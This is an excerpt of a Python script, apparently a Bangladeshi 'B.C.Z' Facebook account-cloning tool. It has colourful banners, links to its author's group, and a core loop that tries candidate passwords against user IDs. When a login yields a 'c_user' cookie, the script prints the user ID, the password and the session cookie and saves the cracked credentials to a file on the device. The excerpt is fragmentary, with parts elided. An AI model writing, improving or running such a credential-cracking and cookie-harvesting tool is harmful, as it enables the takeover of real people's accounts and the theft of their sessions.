...
os.system('xdg-open https://github.com/Mdfaijul01')
name=fuckx.upper()

psb('\x1b[1;31mB.C.Z CLONING START PLEASE WAIT ..........')
time.sleep(3)
...
╚═════╝░░░░░░░░╚════╝░░░░░░░╚══════╝
  ...
  \033[1;32m|     \033[1;33m[✓] CREATED BY\33[0;m   :  \033[1;33mMD FAIJUL ISLAM   \033[1;92m|
  \033[1;32m|     \033[1;32m[✓] FACEBOK      : \033[1;34m  প্রেম মাতাল           \033[1;92m|
  \033[1;32m|     \033[1;35m[✓] GITHUB       :  \033[1;35m Mdfaijul01            \033[1;92m|
  \033[1;32m|     \033[1;36m[✓] TOOL STATUS  :  \033[1;36mRandom Tools          \033[1;92m|
  \033[1;32m|     \033[1;35m[✓] TEAM         :  \033[1;35mBD-CRIMINAL-ZONE            \033[1;92m|
...
def main():
    ...
    banner()
    print(f' ')
    print(f'{M}╔══[ [•] TOOL NAME : {H}MD FAIJUL')
    print(f'{M}║══[ [•] YOR IP    : ')
    print(f'{M}║══[ [•] VERSION   : {H}1.0.9')
    print(f'{M}╚══[ [•] TOOL NAME : {H}B-C-Z\F')
    ...
    if sh =='1':
       os.system('xdg-open https://facebook.com/groups/bd.criminal.zone.we.make.the.system.bcz.01/')
       sh6()
    if sh =='2':
       os.system('xdg-open https://facebook.com/groups/bd.criminal.zone.we.make.the.system.bcz.01/')
       sh7()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;92m[B-C-Z-OK] '+uid+' | '+ps+'\033[0;97m')
                print(f'    {B}[NUMBER📳] {K}'+uid+'  ')
                print(f'    {B}[COOKI💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/B-C-Z-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mB.C.Z","\x1b[1;92mB.C.Z","\x1b[1;93mNATION","\x1b[1;94mB.C.Z","\x1b[1;95mB.C.Z","\x1b[1;96mB.C.Z","\x1b[1;97mB.C.Z","\x1b[1;91mB.C.Z","\x1b[1;92mB.C.Z","\x1b[1;93mB.C.Z","\x1b[1;94mB.C.Z","\x1b[1;95mB.C.Z","\x1b[1;96mB.C.Z"])
